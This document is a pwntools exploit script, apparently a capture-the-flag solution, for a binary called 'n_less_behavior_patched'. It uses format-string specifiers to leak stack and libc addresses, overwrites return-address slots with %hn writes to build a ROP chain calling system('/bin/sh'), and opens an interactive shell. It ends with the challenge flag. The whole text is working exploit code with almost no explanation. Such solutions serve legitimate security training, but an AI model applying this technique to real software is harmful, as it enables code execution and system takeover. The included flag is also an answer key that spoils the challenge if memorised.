#!/usr/bin/env python3

from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")



# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *main + 461
continue
'''.format(**locals())


# Binary filename
exe = './n_less_behavior_patched' #change this
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
payload = flat(
    b'%178$p',
    b'n' * 255,
    b'abcd'
    )
io.sendlineafter(b'enjoy', payload)
io.recvline()
leak = io.recvline()
# log.info(leak)
leak = leak[:14]
stack_base = int(leak,16) - 0x1fe78
accept_addr = stack_base + 0x1f838

payload = flat(
    b'%173$p',
    b'n' * 255,
    b'a'
    )
io.sendline(payload)
# io.recvline()
leak2 = io.recvuntil(b'\n')
leak2 = leak2[:14]
libc_addr = int(leak2,16) - 0x2a1ca

libc.address = libc_addr
# 0x000000000010f75b : pop rdi ; ret
# 0x000000000002882f : ret


pop_gadget = libc_addr + 0x000000000010f75b
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))
ret_gadget = libc_addr + 0x000000000002882f


overwrite_addr = int(leak,16) - 0x128

def overwrite(addr, val):
    l = []
    l.append([val & 0xffff, 0])
    val = val >> 16
    l.append([val & 0xffff, 2])
    val = val >> 16
    l.append([val & 0xffff, 4])
    l = sorted(l, key = lambda x: x[0])
    payload  = f'%{l[0][0]}c%106$hn'.encode()
    payload += f'%{l[1][0] - l[0][0]}c%107$hn'.encode()
    payload += f'%{l[2][0] - l[1][0]}c%108$hn'.encode()
    
    cnt = 0
    for i in range(len(payload)):
        e = chr(payload[i])
        if(e == "n" or e == "x" or e == "X" or e == "p"):
            cnt += 1
    payload += b"n" * (0x100 - cnt)

    payload = payload.ljust(0x300, b"\x00") + p64(addr + l[0][1]) + p64(addr + l[1][1]) + p64(addr + l[2][1])
    payload = payload.ljust(0x500, b"\x00")
    io.send(payload)

overwrite(overwrite_addr +0x8, pop_gadget)
overwrite(overwrite_addr + 0x10, bin_sh)
overwrite(overwrite_addr + 0x18, ret_gadget)
overwrite(overwrite_addr + 0x20, system)
io.recvline()
payload = b'end\x00'
io.sendline(payload)
log.info(leak)
log.info(hex(overwrite_addr))
log.info(leak2)
log.info(hex(libc_addr))
io.interactive()

#flag: KSUS{th3_c0nv3rs4t10n_w4snt_n_l3ss_4ft3r_4ll}